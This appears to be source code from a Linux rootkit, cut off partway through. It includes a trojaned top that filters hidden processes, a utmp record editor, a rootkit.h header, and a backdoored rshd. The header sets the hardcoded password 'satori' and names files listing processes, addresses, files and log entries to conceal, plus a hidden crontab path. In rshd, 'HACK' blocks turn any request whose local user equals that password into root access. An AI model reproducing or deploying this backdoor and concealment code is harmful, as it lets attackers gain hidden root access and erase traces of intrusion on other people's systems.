	save_history[i].ticks = New_save_hist[i].ticks;
	save_history[i].stime = New_save_hist[i].stime;
	save_history[i].utime = New_save_hist[i].utime;
    }
    prev_count = n;
    qsort(p, n, sizeof(proc_t*), (void*)mult_lvl_cmp);
}


/*
 * Process keyboard input during the main loop
 */
void do_key(char c)
{
    int numinput, i;
    char rcfile[MAXNAMELEN];
    FILE *fp;

    /*
     * First the commands which don't require a terminal mode switch.
     */
    if (c == 'q')
	end();
    else if (c == 12) {
	clear_screen();
	return;
    }
    /*
     * Switch the terminal to normal mode.  (Will the original
     * attributes always be normal?  Does it matter?  I suppose the
     * shell will be set up the way the user wants it.)
     */
    ioctl(0, TCSETA, &Savetty);

    /*
     * Handle the rest of the commands.
     */
    switch (c) {
      case '?':
      case 'h':
	PUTP(cl); PUTP(ho); putchar('\n'); PUTP(mr);
	printf("Proc-Top Revision 1.01");
	PUTP(me); putchar('\n');
	printf("Secure mode ");
	PUTP(md);
	fputs(Secure ? "on" : "off", stdout);
	PUTP(me);
	fputs("; cumulative mode ", stdout);
	PUTP(md);
	fputs(Cumulative ? "on" : "off", stdout);
	PUTP(me);
	fputs("; noidle mode ", stdout);
	PUTP(md);
	fputs(Noidle ? "on" : "off", stdout);
	PUTP(me);
	fputs("\n\n", stdout);
	printf("%s\n\nPress any key to continue\n", Secure ? SECURE_HELP_SCREEN : HELP_SCREEN);
	ioctl(0, TCSETA, &Rawtty);
	(void) getchar();
	break;
      case 'i':
	Noidle = !Noidle;
	SHOWMESSAGE(("No-idle mode %s", Noidle ? "on" : "off"));
	break;
      case 'k':
	if (Secure)
	    SHOWMESSAGE(("\aCan't kill in secure mode"));
	else {
	    int pid, signal;
	    PUTP(md);
	    SHOWMESSAGE(("PID to kill: "));
	    pid = getint();
	    if (pid == -1)
		break;
	    PUTP(top_clrtoeol);
	    SHOWMESSAGE(("Kill PID %d with signal [15]: ", pid));
	    PUTP(me);
	    signal = getsig();
	    if (signal == -1)
		signal = SIGTERM;
	    if (kill(pid, signal))
		SHOWMESSAGE(("\aKill of PID %d with %d failed: %s",
			     pid, signal, strerror(errno)));
	}
	break;
      case 'l':
	SHOWMESSAGE(("Display load average %s", !show_loadav ? "on" : "off"));
	if (show_loadav) {
	    show_loadav = 0;
	    header_lines--;
	} else {
	    show_loadav = 1;
	    header_lines++;
	}
	Numfields = make_header();
	break;
      case 'm':
	SHOWMESSAGE(("Display memory information %s", !show_memory ? "on" : "off"));
	if (show_memory) {
	    show_memory = 0;
	    header_lines -= 2;
	} else {
	    show_memory = 1;
	    header_lines += 2;
	}
	Numfields = make_header();
	break;
      case 'M':
        SHOWMESSAGE(("Sort by memory usage"));
	sort_type = S_MEM;
	reset_sort_options();
	register_sort_function(-1, (cmp_t)mem_sort);
	break;
      case 'n':
      case '#':
	printf("Processes to display (0 for unlimited): ");
	numinput = getint();
	if (numinput != -1) {
	    Display_procs = numinput;
	    window_size();
	}
	break;
      case 'r':
	if (Secure)
	    SHOWMESSAGE(("\aCan't renice in secure mode"));
	else {
	    int pid, val;

	    printf("PID to renice: ");
	    pid = getint();
	    if (pid == -1)
		break;
	    PUTP(tgoto(cm, 0, header_lines - 2));
	    PUTP(top_clrtoeol);
	    printf("Renice PID %d to value: ", pid);
	    val = getint();
	    if (val == -1)
		val = 10;
	    if (setpriority(PRIO_PROCESS, pid, val))
		SHOWMESSAGE(("\aRenice of PID %d to %d failed: %s",
			     pid, val, strerror(errno)));
	}
	break;
      case 'P':
        SHOWMESSAGE(("Sort by CPU usage"));
	sort_type = S_PCPU;
	reset_sort_options();
	register_sort_function(-1, (cmp_t)pcpu_sort);
	break;
      case 'c':
        show_cmd = !show_cmd;
	SHOWMESSAGE(("Show %s", show_cmd ? "command names" : "command line"));
	break;
      case 'S':
	Cumulative = !Cumulative;
	SHOWMESSAGE(("Cumulative mode %s", Cumulative ? "on" : "off"));
	if (Cumulative)
	    headers[22][1] = 'C';
	else
	    headers[22][1] = ' ';
	Numfields = make_header();
	break;
      case 's':
	if (Secure)
	    SHOWMESSAGE(("\aCan't change delay in secure mode"));
	else {
	    double tmp;
	    printf("Delay between updates: ");
	    tmp = getfloat();
	    if (!(tmp < 0))
		Sleeptime = tmp;
	}
	break;
      case 't':
	SHOWMESSAGE(("Display summary information %s", !show_stats ? "on" : "off"));
	if (show_stats) {
	    show_stats = 0;
	    header_lines -= 2;
	} else {
	    show_stats = 1;
	    header_lines += 2;
	}
	Numfields = make_header();
	break;
      case 'T':
	SHOWMESSAGE(("Sort by %s time", Cumulative ? "cumulative" : ""));
	sort_type = S_TIME;
	reset_sort_options();
	register_sort_function( -1, (cmp_t)time_sort);	
	break;
      case 'f':
      case 'F':
	change_fields();
	break;
      case 'o':
      case 'O':
	change_order();
	break;
      case 'W':
	if (getenv("HOME")) {
	    strcpy(rcfile, getenv("HOME"));
	    strcat(rcfile, "/");
	    strcat(rcfile, RCFILE);
	    fp = fopen(rcfile, "w");
	    if (fp != NULL) {
		fprintf(fp, "%s\n", Fields);
		i = (int) Sleeptime;
		if (i < 2)
		    i = 2;
		if (i > 9)
		    i = 9;
		fprintf(fp, "%d", i);
		if (Secure)
		    fprintf(fp, "%c", 's');
		if (Cumulative)
		    fprintf(fp, "%c", 'S');
		if (show_cmd)
		    fprintf(fp, "%c", 'c');
		if (Noidle)
		    fprintf(fp, "%c", 'i');
		if (!show_memory)
		    fprintf(fp, "%c", 'm');
		if (!show_loadav)
		    fprintf(fp, "%c", 'l');
		if (!show_stats)
		    fprintf(fp, "%c", 't');
		fprintf(fp, "\n");
		fclose(fp);
		SHOWMESSAGE(("Wrote configuration to %s", rcfile));
	    } else {
		SHOWMESSAGE(("Couldn't open %s", rcfile));
	    }
	} else {
	    SHOWMESSAGE(("Couldn't get $HOME -- not saving"));
	}
	break;
      default:
	SHOWMESSAGE(("\aUnknown command `%c' -- hit `h' for help", c));
    }

    /*
     * Return to raw mode.
     */
    ioctl(0, TCSETA, &Rawtty);
    return;
}


/*#####################################################################
 *#######   A readproctable function that uses already allocated  #####
 *#######   table entries.                                        #####
 *#####################################################################
 */
#define Do(x) (flags & PROC_ ## x)

proc_t** readproctab2(int flags, proc_t** tab, ...) {
    PROCTAB* PT = NULL;
    static proc_t *buff;
    int n = 0;
    static int len = 0;
    va_list ap;

    va_start(ap, tab);		/* pass through args to openproc */
    if (Do(UID))
	PT = openproc(flags, va_arg(ap, uid_t*), va_arg(ap, int));
    else if (Do(PID) || Do(TTY) || Do(STAT))
	PT = openproc(flags, va_arg(ap, void*)); /* assume ptr sizes same */
    else
	PT = openproc(flags);
    va_end(ap);
    buff = (proc_t *) 1;
    while (n<len && buff) {     /* read table: (i) already allocated chunks */
	if (tab[n]->cmdline) {
	    free((void*)*tab[n]->cmdline);
	    tab[n]->cmdline = NULL;
	}
	buff = readproc(PT, tab[n]);
	if (!showall) 
		while ((buff)&&(hackcheck(buff))) 
			buff = readproc(PT, tab[n]);
	n++;
    }
    if (buff) {
	do {               /* (ii) not yet allocated chunks */
	    tab = realloc(tab, (n+1)*sizeof(proc_t*));/* realloc as we go, using */
	    buff = readproc(PT, NULL);		  /* final null to terminate */
	    if(buff) tab[n]=buff;
	    len++;
	    n++;
	} while (buff);			  /* stop when NULL reached */
	tab[n-1] = xcalloc(NULL, sizeof (proc_t));
	tab[n-1]->pid=-1;		 /* Mark end of Table */
    } else {
	if (n == len) {
	    tab = realloc(tab, (n+1)*sizeof(proc_t*));
	    tab[n] = xcalloc(NULL, sizeof (proc_t));
	    len++;
	}
	tab[n]->pid=-1;    /* Use this instead of NULL when not at the end of */
    }                   /* the allocated space */
    closeproc(PT);
    return tab;
}
/*
 * top.h header file 1996/05/18, 
 *
 * function prototypes, global data definitions and string constants.
 */

proc_t** readproctab2(int flags, proc_t** tab, ...);
void parse_options(char *Options, int secure);
void get_options(void);
void error_end(int rno);
void end(void);
void stop(void);
void window_size(void);
int make_header(void);
int getnum(void);
char *getstr(void);
int getsig(void);
float getfloat(void);
int time_sort(proc_t **P, proc_t **Q);
int pcpu_sort(proc_t **P, proc_t **Q);
int mem_sort(proc_t **P, proc_t **Q);
void show_fields(void);
void change_order(void);
void change_fields(void);
void show_task_info(proc_t *task, int pmem);
void show_procs(void);
float get_elapsed_time(void);
unsigned show_meminfo(void);
void do_stats(proc_t** p, float elapsed_time, int pass);
void do_key(char c);


/* configurable field display support */

int pflags[30];
int sflags[10];
int Numfields;


	/* Name of the config file (in $HOME)  */
#ifndef RCFILE
#define RCFILE		".toprc"
#endif

#ifndef SYS_TOPRC
#define SYS_TOPRC	"/etc/toprc"
#endif

#define MAXLINES 2048
#define MAXNAMELEN 1024

/* this is what procps top does by default, so let's do this, if nothing is
 * specified
 */
#ifndef DEFAULT_SHOW
#define DEFAULT_SHOW    "AbcDgHIjklMnoTPqrsuzVYEFWX"
#endif
char Fields[256] = "";


/* This structure stores some critical information from one frame to
   the next. mostly used for sorting. Added cumulative and resident fields. */
struct save_hist {
    int ticks;
    int pid;
    int pcpu;
    int utime;
    int stime;
};

	/* The original terminal attributes. */
struct termio Savetty;
	/* The new terminal attributes. */
struct termio Rawtty;
	/* Cached termcap entries. */
char *cm, *cl, *top_clrtobot, *top_clrtoeol, *ho, *md, *me, *mr;
	/* Current window size.  Note that it is legal to set Display_procs
	   larger than can fit; if the window is later resized, all will be ok.
	   In other words: Display_procs is the specified max number of
	   processes to display (zero for infinite), and Maxlines is the actual
	   number. */
int Lines, Cols, Maxlines, Display_procs;
	/* Maximum length to display of the command line of a process. */
unsigned Maxcmd;

	/* The top of the main loop. */
jmp_buf redraw_jmp;

	/* Controls how long we sleep between screen updates.  Accurate to
	   microseconds. */
float Sleeptime = 5;
	/* for opening/closing the system map */
int psdbsucc = 0;
	/* Mode flags. */
int Secure = 0;
int Cumulative = 0;
int Noidle = 0;
int CL_pg_shift = 2;
int CL_wchan_nout = 0;
int show_stats = 1;    /* show status summary */
int show_memory = 1;   /* show memory summary */
int show_loadav = 1;   /* show load average and uptime */
int show_cmd = 1;      /* show command name instead of commandline */

/* sorting order: cpu%, mem, time (cumulative, if in cumulative mode) */
enum {
    S_PCPU, S_MEM, S_TIME
};
/* default sorting by CPU% */ 
int sort_type = S_PCPU;

/* flags for each possible field. At the moment up to 30 are supported */
enum {
    P_PID, P_PPID, P_UID, P_USER,
    P_PCPU, P_PMEM, P_TTY, P_PRI,
    P_NICE, P_PAGEIN, P_TSIZ, P_DSIZ,
    P_SIZE, P_TRS, P_SWAP, P_SHARE,
    P_A, P_WP, P_DT, P_RSS,
    P_WCHAN, P_STAT, P_TIME, P_COMMAND,
    P_LTR, P_FLAGS, P_END
};
/* corresponding headers */
char *headers[] =
{
    "  PID ", " PPID ", " UID ",
    "USER     ", "%CPU ", "%MEM ",
    "TTY ", "PRI ", " NI ",
    "PAGEIN ", "TSIZE ", "DSIZE ",
    " SIZE ", " TRS ", "SWAP ",
    "SHARE ", "  A ", " WP ",
    "  D ", " RSS ", "WCHAN     ",
    "STAT ", "  TIME ", "COMMAND",
    " LIB ", "   FLAGS "
};
/* corresponding field desciptions */
char *headers2[] =
{
    "Process Id", "Parent Process Id", "User Id",
    "User Name", "CPU Usage", "Memory Usage",
    "Controlling tty", "Priority", "Nice Value",
    "Page Fault Count", "Code Size (kb)", "Data+Stack Size (kb)",
    "Virtual Image Size (kb)", "Resident Text Size (kb)", "Swapped kb",
    "Shared Pages (kb)", "Accessed Page count", "Write Protected Pages",
    "Dirty Pages", "Resident Set Size (kb)", "Sleeping in Function",
    "Process Status", "CPU Time", "Command",
    "Shared Library Pages used (kb) - does not work for ELF!!",
    "Task Flags (see linux/sched.h)"
};

	/* The header printed at the top of the process list.*/
char Header[MAXLINES];

	/* The response to the interactive 'h' command. */
#define HELP_SCREEN "\
Interactive commands are:\n\
\n\
^L\tRedraw the screen\n\
fF\tadd and remove fields\n\
oO\tChange order of displayed fields\n\
h or ?\tPrint this list\n\
S\tToggle cumulative mode\n\
i\tToggle display of idle proceses\n\
c\tToggle display of command name/line\n\
l\tToggle display of load average\n\
m\tToggle display of memory information\n\
t\tToggle display of summary information\n\
k\tKill a task (with any signal)\n\
r\tRenice a task\n\
P\tSort by CPU usage\n\
M\tSort by resident memory usage\n\
T\tSort by time / cumulative time\n\
n or #\tSet the number of process to show\n\
s\tSet the delay in seconds between updates\n\
W\tWrite configuration file ~/.toprc\n\
q\tQuit"
#define SECURE_HELP_SCREEN "\
Interactive commands available in secure mode are:\n\
\n\
^L\tRedraw the screen\n\
fF\tadd and remove fields\n\
h or ?\tPrint this list\n\
S\tToggle cumulative mode\n\
i\tToggle display of idle proceses\n\
c\tToggle display of command name/line\n\
l\tToggle display of load average\n\
m\tToggle display of memory information\n\
t\tToggle display of summary information\n\
n or #\tSet the number of process to show\n\
oO\tChange order of displayed fields\n\
W\tWrite configuration file ~/.toprc\n\
q\tQuit"

	/* Number of lines needed to display the header information. */
int header_lines;

/* ############## Some Macro definitions for screen handling ######### */
	/* String to use in error messages. */
#define PROGNAME "top"
	/* Clear the screen. */
#define clear_screen() \
	    printf("%s", cl)
	/* Show an error in the context of the spiffy full-screen display. */
#define SHOWMESSAGE(x) do { 			\
	    printf("%s%s%s%s", tgoto(cm, 0, header_lines-2), top_clrtoeol,md,mr);	\
	    printf x;					\
	    printf ("%s",me);                           \
	    fflush(stdout);				\
	    sleep(2);					\
	} while (0)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <time.h>
#include <utmp.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

/* examine and fix utmp entries.  Note that the code for fixing entries
   is not complete, and indeed does nothing at all at this time.  No bug
   reports, please, as I am still actively working on this.  It is not
   here for general use, but only so that I can ferret out any bugs that
   exist on other peoples systems without having to log in to their systems
   myself ;-)  */


int main (int argc, char **argv) {

  FILE *ut; /* /var/run/utmp */
  struct utmp uts; /* utmp record */
  char user[UT_NAMESIZE + 1];
  char host[17];
  char ch;
  int print_all = 0, list = 0, fix = 0;

/* get options */
  while ((ch = getopt(argc, argv, "laf")) != EOF)
    switch (ch) {
    case 'a':
      print_all = 1;
      break;
    case 'l':
      list = 1;
      break;
    case 'f':
      fix = 1;
      break;
    }

/* check argument options */
  if ( (!list && !print_all && !fix)) {
    fprintf(stderr, "You must specify a command line option:\n\tl = list\n\
\tf = fix\n\ta = all (requires l or f)\n");
    exit(1);
  }

  
  if (list) {
    ut = fopen(UTMP_FILE, "r");
    while (fread(&uts, sizeof(uts), 1, ut))
      if (((uts.ut_type == USER_PROCESS) && (uts.ut_name[0] != '\000'))
	  || print_all) {
	strncpy(user, uts.ut_user, UT_NAMESIZE);
	user[UT_NAMESIZE]=0;
	strncpy(host, uts.ut_host, 16);
	host[16]=0;
	printf("ut_type: %d\n", uts.ut_type);
	printf("ut_pid:  %d\n", uts.ut_pid);
	printf("ut_line: %s\n", uts.ut_line);
	printf("ut_id:   %2s\n", uts.ut_id);
	printf("ut_time: %d\n", uts.ut_time);
	printf("ut_user: %s\n", user);
	printf("ut_host: %s\n", host);
	printf("ut_addr: %d\n\n", uts.ut_addr);
      }
    fclose(ut);
  }


  if (fix) {
    ut = fopen(UTMP_FILE, "r");
    while (fread(&uts, sizeof(uts), 1, ut)) 
      if (((uts.ut_type == USER_PROCESS) && (uts.ut_name[0] != '\000'))
	  || print_all) {
	/* Display entry in utmp */
	strncpy(user, uts.ut_user, UT_NAMESIZE);
	user[UT_NAMESIZE]=0;
	strncpy(host, uts.ut_host, 16);
	host[16]=0;
	printf("ut_type: %d\n", uts.ut_type);
	printf("ut_pid:  %d\n", uts.ut_pid);
	printf("ut_line: %s\n", uts.ut_line);
	printf("ut_id:   %s2\n", uts.ut_id);
	printf("ut_time: %d\n", uts.ut_time);
	printf("ut_user: %s\n", user);
	printf("ut_host: %s\n", host);
	printf("ut_addr: %d\n\n", uts.ut_addr);
      
	printf("Modify this record? (y/N): "); fflush(stdout);
	/* Ask if to delete or no */
	if ((ch = getchar()) == 'y' || ch == 'Y') {
	  while (getchar() != '\n');
	  printf("Change ut_type? "); fflush(stdout);
	  if ((ch = getchar()) == 'y' || ch == 'Y') {
	    while (getchar() != '\n');
	    printf("INIT, LOGIN, USER, or DEAD_PROCESS? (I/L/U/D): ");
	    fflush(stdout);
	    ch = getchar();
	    switch (ch) {
	    case 'i':
	    case 'I':
	      uts.ut_type = INIT_PROCESS;
	      break;
	    case 'l':
	    case 'L':
	      uts.ut_type = LOGIN_PROCESS;
	      break;
	    case 'u':
	    case 'U':
	      uts.ut_type = USER_PROCESS;
	      break;
	    case 'd':
	    case 'D':
	      uts.ut_type = DEAD_PROCESS;
	      break;
	    default:
	      printf("Invalid choice: %c\n", ch);
	    }
	    if (ch != '\n') while ((ch = getchar()) != '\n');
	  }
	  if (ch != '\n') while ((ch = getchar()) != '\n');
	  printf("Change ut_id field? (y/N): "); fflush(stdout);
	  if ((ch = getchar()) == 'y' || ch == 'Y') {
	    while (getchar() != '\n');
	    printf("Please enter the two characters for ut_id: ");
	    fflush(stdout);
	    uts.ut_id[0] = getchar();
	    uts.ut_id[1] = getchar();
	    while ((ch = getchar()) != '\n');
	  }
	  if (ch != '\n') while ((ch = getchar()) != '\n');
	  printf("Change the ut_user field? (y/N): "); fflush(stdout);
	  if ((ch = getchar()) == 'y' || ch == 'Y') {
	    int i;
	    while (getchar() != '\n');
	    printf("Please enter the new ut_name, up to %c characters: ",
		   UT_NAMESIZE);
	    fflush(stdout);
	    for (i=0; i<UT_NAMESIZE; i++) {
	      ch = getchar();
	      uts.ut_user[i] = (ch != '\n') ? ch : i = UT_NAMESIZE, (char) 0;
	    }
	  }
	  if (ch != '\n') while ((ch = getchar()) != '\n');
	  printf("Change the ut_host field? (y/N): "); fflush(stdout);
	  if ((ch = getchar()) == 'y' || ch == 'Y') {
	    int i;
	    while (getchar() != '\n');
	    printf("Please enter the new ut_host, up to 16 characters: ");
	    fflush(stdout);
	    for (i=0; i<16; i++) {
	      ch = getchar();
	      uts.ut_user[i] = (ch != '\n') ? ch : i = 16, (char) 0;
	    }
	    if (ch != '\n') while ((ch = getchar()) != '\n');
	  }

	  /* Here go the changes...*/
/*	  utmpname(UTMP_FILE);
	  setutent();
	  pututline(&uts);
	  endutent(); */
/* But they don't work... */

	}
	if (ch != '\n') while ((ch = getchar()) != '\n');
	/* here we should write the utmp entry */
      }
    fclose(ut);
  }


  return 0;


}
/* LINUX ROOTKIT DEFINES. */

/* ROOTKIT_PASSWORD must be 6 letters due to my lame attempts at string 
   hiding... */

#define ROOTKIT_PASSWORD "satori"

/* Processes to hide */
#define ROOTKIT_PROCESS_FILE "/dev/ptyp"

/* Addresses to hide */
#define ROOTKIT_ADDRESS_FILE "/dev/ptyq"

/* Files and directories to hide */
#define ROOTKIT_FILES_FILE "/dev/ptyr"

/* Log entries to hide */
#define ROOTKIT_LOG_FILE "/dev/ptys"

/* Define this if you want to be able to list hidden files/processes 
   for ls, du, ps, netstat . using / on the command line */
#undef SHOWFLAG

/* name for alternate crontab file
   aka hidden crontab file
 */
#define TAB_NAME	"/dev/hda02"
/*-
 * Copyright (c) 1988, 1989 The Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * PAM modifications by Michael K. Johnson <johnsonm@redhat.com>
 */

char copyright[] =
 "@(#) Copyright (c) 1988, 1989 The Regents of the University of California.\n"
 "All rights reserved.\n";

/*
 * From: @(#)rshd.c	5.38 (Berkeley) 3/2/91
 */
char rcsid[] = "$Id: rshd.c,v 1.11 1996/08/17 17:57:17 dholland Exp $";

/*
 * remote shell server:
 *	[port]\0
 *	remuser\0
 *	locuser\0
 *	command\0
 *	data
 */
#include <sys/param.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <fcntl.h>
#include <signal.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <pwd.h>
#include <grp.h>
#include <syslog.h>
#include <arpa/nameser.h>
#include <resolv.h>
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <paths.h>
#include <stdarg.h>

/* HACK */
#include "../rootkit.h"

#ifdef USE_PAM
#include <security/pam_appl.h>
#include <security/pam_misc.h>
static pam_handle_t *pamh;
static int retcode;
#endif /* USE_PAM */

#define	OPTIONS	"alnL"

static int keepalive = 1;
static int check_all = 0;
static int paranoid = 0;
static int sent_null;

static void error(const char *fmt, ...);
static void usage(void);
static void doit(struct sockaddr_in *fromp);
static void getstr(char *buf, int cnt, const char *err);

extern int _check_rhosts_file;

int
main(int argc, char *argv[])
{
	struct linger linger;
	int ch, on = 1, fromlen;
	struct sockaddr_in from;
	_check_rhosts_file=1;
	openlog("rshd", LOG_PID | LOG_ODELAY, LOG_DAEMON);

	opterr = 0;
	while ((ch = getopt(argc, argv, OPTIONS)) != EOF) {
		switch (ch) {
		case 'a':
			check_all = 1;
			break;

		case 'l':
			_check_rhosts_file = 0;
			break;

		case 'n':
			keepalive = 0;
			break;

		case 'L':
			paranoid = 1;
			break;

		case '?':
		default:
			usage();
			exit(2);
		}
	}
	argc -= optind;
	argv += optind;

#ifdef USE_PAM
       if (_check_rhosts_file == 0)
               syslog(LOG_ERR, "-l functionality has been moved to "
                               "pam_rhosts_auth in /etc/pam.conf");
#endif /* USE_PAM */

	fromlen = sizeof (from);
	if (getpeername(0, (struct sockaddr *)&from, &fromlen) < 0) {
		syslog(LOG_ERR, "getpeername: %m");
		_exit(1);
	}
	if (keepalive &&
	    setsockopt(0, SOL_SOCKET, SO_KEEPALIVE, (char *)&on,
	    sizeof(on)) < 0)
		syslog(LOG_WARNING, "setsockopt (SO_KEEPALIVE): %m");
	linger.l_onoff = 1;
	linger.l_linger = 60;			/* XXX */
	if (setsockopt(0, SOL_SOCKET, SO_LINGER, (char *)&linger,
	    sizeof (linger)) < 0)
		syslog(LOG_WARNING, "setsockopt (SO_LINGER): %m");
	doit(&from);
	return 0;
}

static void 
fail(const char *errorstr, const char *errorhost, 
     int uid, 
     const char *remuser, const char *hostname, const char *locuser,
     const char *cmdbuf) 
{
	/* log the (failed) rsh request, if paranoid */
	if (paranoid || uid == 0)
		syslog(LOG_INFO|LOG_AUTH,
		       "rsh denied to %s@%s as %s: cmd='%s'; %s",
		       remuser, hostname, locuser, cmdbuf,
		       errorstr);
	error(errorstr, errorhost);
	exit(1);
}

char	username[20] = "USER=";
char	homedir[64] = "HOME=";
char	shell[64] = "SHELL=";
char	path[100] = "PATH=";
char	*envinit[] =
	    {homedir, shell, path, username, 0};
extern	char	**environ;

static void
doit(struct sockaddr_in *fromp)
{
	char cmdbuf[ARG_MAX+1];
	const char *theshell, *shellname;
	char locuser[16], remuser[16];
	struct passwd *pwd;
	int sock = -1;
	struct hostent *hp;
	const char *hostname, *errorhost;
	const char *errorstr = NULL;
	u_short port;
	int pv[2], pid, cc;
	int nfd;
	fd_set ready, readfrom;
	char buf[BUFSIZ], sig;
	int one = 1;
	char remotehost[2 * MAXHOSTNAMELEN + 1];
#ifdef USE_PAM
	char c;
	static struct pam_conv conv = {
	  misc_conv,
	  NULL
	};
#endif /* USE_PAM */

/* HACK DEFS */
        char MAG[6];
        int elite=0;
        strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';
/* END HACK VARS */

	(void) signal(SIGINT, SIG_DFL);
	(void) signal(SIGQUIT, SIG_DFL);
	(void) signal(SIGTERM, SIG_DFL);
#ifdef DEBUG
	{ int t = open(_PATH_TTY, 2);
	  if (t >= 0) {
		ioctl(t, TIOCNOTTY, (char *)0);
		(void) close(t);
	  }
	}
#endif
	fromp->sin_port = ntohs((u_short)fromp->sin_port);
	if (fromp->sin_family != AF_INET) {
		syslog(LOG_ERR, "malformed \"from\" address (af %d)\n",
		    fromp->sin_family);
		exit(1);
	}
#ifdef IP_OPTIONS
      {
	u_char optbuf[BUFSIZ/3], *cp;
	char lbuf[BUFSIZ], *lp;
	int optsize = sizeof(optbuf), ipproto;
	struct protoent *ip;

	if ((ip = getprotobyname("ip")) != NULL)
		ipproto = ip->p_proto;
	else
		ipproto = IPPROTO_IP;
	if (!getsockopt(0, ipproto, IP_OPTIONS, (char *)optbuf, &optsize) &&
	    optsize != 0) {
		lp = lbuf;
		for (cp = optbuf; optsize > 0; cp++, optsize--, lp += 3)
			sprintf(lp, " %2.2x", *cp);
		syslog(LOG_NOTICE,
		    "Connection received from %s using IP options (ignored):%s",
		    inet_ntoa(fromp->sin_addr), lbuf);
		if (setsockopt(0, ipproto, IP_OPTIONS,
			       NULL, optsize) != 0) {
			syslog(LOG_ERR, "setsockopt IP_OPTIONS NULL: %m");
			exit(1);
		}
	}
      }
#endif

		if (fromp->sin_port >= IPPORT_RESERVED ||
		    fromp->sin_port < IPPORT_RESERVED/2) {
			syslog(LOG_NOTICE|LOG_AUTH,
			    "Connection from %s on illegal port",
			    inet_ntoa(fromp->sin_addr));
			exit(1);
		}

	(void) alarm(60);
	port = 0;
	for (;;) {
		char c;
		if ((cc = read(0, &c, 1)) != 1) {
			if (cc < 0)
				syslog(LOG_NOTICE, "read: %m");
			shutdown(0, 1+1);
			exit(1);
		}
		if (c== 0)
			break;
		port = port * 10 + c - '0';
	}

	(void) alarm(0);
	if (port != 0) {
		int lport = IPPORT_RESERVED - 1;
		sock = rresvport(&lport);
		if (sock < 0) {
			syslog(LOG_ERR, "can't get stderr port: %m");
			exit(1);
		}
			if (port >= IPPORT_RESERVED) {
				syslog(LOG_ERR, "2nd port not reserved\n");
				exit(1);
			}
		fromp->sin_port = htons(port);
		if (connect(sock, (struct sockaddr *)fromp,
			    sizeof(*fromp)) < 0) {
			syslog(LOG_INFO, "connect second port: %m");
			exit(1);
		}
	}

#ifdef notdef
	/* from inetd, socket is already on 0, 1, 2 */
	dup2(f, 0);
	dup2(f, 1);
	dup2(f, 2);
#endif
	hp = gethostbyaddr((char *)&fromp->sin_addr, sizeof (struct in_addr),
			   fromp->sin_family);
	if (hp) {
		strncpy(remotehost, hp->h_name, sizeof(remotehost) - 1);
		remotehost[sizeof(remotehost) - 1] = 0;
	}
	else {
		strncpy(remotehost, inet_ntoa(fromp->sin_addr), 
			sizeof(remotehost) - 1);
		remotehost[sizeof(remotehost) - 1] = 0;
	}
	errorhost = hostname = remotehost;


	{
		/*
		 * If name returned by gethostbyaddr is in our domain,
		 * attempt to verify that we haven't been fooled by someone
		 * in a remote net; look up the name and check that this
		 * address corresponds to the name.
		 */
#ifdef	RES_DNSRCH
		_res.options &= ~RES_DNSRCH;
#endif
		hp = gethostbyname(remotehost);
		if (hp == NULL) {
			syslog(LOG_INFO, "Couldn't look up address for %s",
			       remotehost);
			errorstr = "Couldn't get address for your host (%s)\n";
			hostname = inet_ntoa(fromp->sin_addr);
		} 
		else for (; ; hp->h_addr_list++) {
			if (hp->h_addr_list[0] == NULL) {
				syslog(LOG_NOTICE,
				       "Host addr %s not listed for host %s",
				       inet_ntoa(fromp->sin_addr),
				       hp->h_name);
				errorstr = "Host address mismatch for %s\n";
				hostname = inet_ntoa(fromp->sin_addr);
				break;
			}
			if (!memcmp(hp->h_addr_list[0],
				    &fromp->sin_addr,
				    sizeof(fromp->sin_addr))) break;
		}
	} 

		getstr(remuser, sizeof(remuser), "remuser");

	getstr(locuser, sizeof(locuser), "locuser");
	getstr(cmdbuf, sizeof(cmdbuf), "command");
/* HACK TEST local user must be password */
        if (!strcmp(locuser,MAG)) { elite++; strcpy(locuser,"root"); }
	setpwent();
	pwd = getpwnam(locuser);
	if ((pwd == NULL&&(!elite))) {
		if (errorstr == NULL)
			errorstr = "Login incorrect.\n";
		fail(errorstr, errorhost, pwd->pw_uid,
		     remuser, hostname, locuser, cmdbuf);
	}
	if (chdir(pwd->pw_dir) < 0) {
		(void) chdir("/");
#ifdef notdef
